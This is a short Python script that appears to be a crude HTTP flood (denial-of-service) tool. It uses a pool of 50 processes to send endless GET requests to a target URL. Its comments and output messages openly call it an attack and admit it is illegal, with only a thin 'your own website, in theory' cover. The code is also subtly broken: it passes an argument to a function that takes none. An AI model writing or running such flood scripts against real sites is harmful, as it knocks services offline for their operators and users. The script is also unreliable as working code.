import requests
import multiprocessing
import time

# The target - your own website, in theory
TARGET_URL = 'http://your-own-website.com'

# The number of workers in the pool - adjust based on your machine's capabilities
NUM_WORKERS = 50

def attack():
    while True:
        # Sending a large number of requests to the target website
        response = requests.get(TARGET_URL)
        if response.status_code == 200:
            print(f"Attack successful! >:) Status code: {response.status_code}")
        else:
            print(f"Attack blocked! :( Status code: {response.status_code}")
        time.sleep(1)  # Give it a rest, champ

# If this script was legal, which it isn't, this would unleash the hounds
if __name__ == "__main__":
    with multiprocessing.Pool(NUM_WORKERS) as pool:
        pool.map(attack, range(NUM_WORKERS))
